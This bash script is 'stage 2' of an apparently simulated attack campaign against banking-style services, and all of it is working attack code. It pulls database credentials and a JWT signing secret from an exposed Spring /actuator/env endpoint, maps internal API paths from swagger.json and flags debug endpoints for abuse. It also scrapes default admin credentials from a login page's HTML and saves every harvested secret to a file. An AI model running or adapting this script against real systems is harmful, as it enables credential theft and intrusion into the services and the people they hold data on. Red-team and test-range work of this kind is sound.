#!/bin/bash
set -uo pipefail
source "$(dirname "$0")/common.sh"

# Stage 2: credential harvest. Requires the app-tier pivot from
# pivot_apptier.sh -- without it these just time out, which is itself a
# realistic "no route to host" signal worth leaving in the campaign log.
if ! have_pivot; then
  log "HARVEST" "No app-tier route yet -- skipping (run pivot_apptier.sh first)"
  exit 0
fi

CORE_BANKING_HTTP="http://${CORE_BANKING_IP}:80"
TRANSACTIONS_HTTP="http://${TRANSACTIONS_IP}:80"
SUPPLY_CHAIN_HTTP="http://${SUPPLY_CHAIN_IP}:80"

log "HARVEST" "Pulling core-banking's unauthenticated /actuator/env dump"
env_json=$(curl -s "${CORE_BANKING_HTTP}/actuator/env")
if [ -n "$env_json" ]; then
  db_url=$(echo "$env_json" | jq -r '.propertySources[0].properties["spring.datasource.url"].value // empty')
  db_user=$(echo "$env_json" | jq -r '.propertySources[0].properties["spring.datasource.username"].value // empty')
  db_pass=$(echo "$env_json" | jq -r '.propertySources[0].properties["spring.datasource.password"].value // empty')
  jwt_secret=$(echo "$env_json" | jq -r '.propertySources[0].properties["jwt.signing.secret"].value // empty')
  log "HARVEST" "actuator/env leaked datasource=${db_url} user=${db_user} jwt_secret=${jwt_secret:0:8}..."
  [ -n "$db_user" ] && save_cred CORE_BANKING_DB_USER "$db_user"
  [ -n "$db_pass" ] && save_cred CORE_BANKING_DB_PASS "$db_pass"
  [ -n "$jwt_secret" ] && save_cred JWT_SIGNING_SECRET "$jwt_secret"
else
  log "HARVEST" "core-banking unreachable"
fi

log "HARVEST" "Pulling transactions' /swagger.json internal endpoint map"
swagger_json=$(curl -s "${TRANSACTIONS_HTTP}/swagger.json")
if [ -n "$swagger_json" ]; then
  endpoints=$(echo "$swagger_json" | jq -r '.paths | keys[]' 2>/dev/null | tr '\n' ' ')
  log "HARVEST" "swagger exposed internal endpoints: ${endpoints}"
  echo "$endpoints" | grep -qi debug && log "HARVEST" "debug endpoint present -- flagged for abuse_debug_sql.sh"
else
  log "HARVEST" "transactions unreachable"
fi

log "HARVEST" "Scraping supply-chain login page for leaked integration creds"
portal_html=$(curl -s "${SUPPLY_CHAIN_HTTP}/")
leaked=$(echo "$portal_html" | grep -oE '[a-zA-Z0-9_.+-]+-admin\s*/\s*[A-Za-z0-9]+' || true)
if [ -n "$leaked" ]; then
  log "HARVEST" "supply-chain HTML comment leaked default creds: ${leaked}"
  save_cred SUPPLY_CHAIN_USER "$(echo "$leaked" | cut -d/ -f1 | tr -d ' ')"
  save_cred SUPPLY_CHAIN_PASS "$(echo "$leaked" | cut -d/ -f2 | tr -d ' ')"
else
  log "HARVEST" "no leaked creds found in supply-chain HTML"
fi

log "HARVEST" "credential harvest complete, state in $CREDS_FILE"
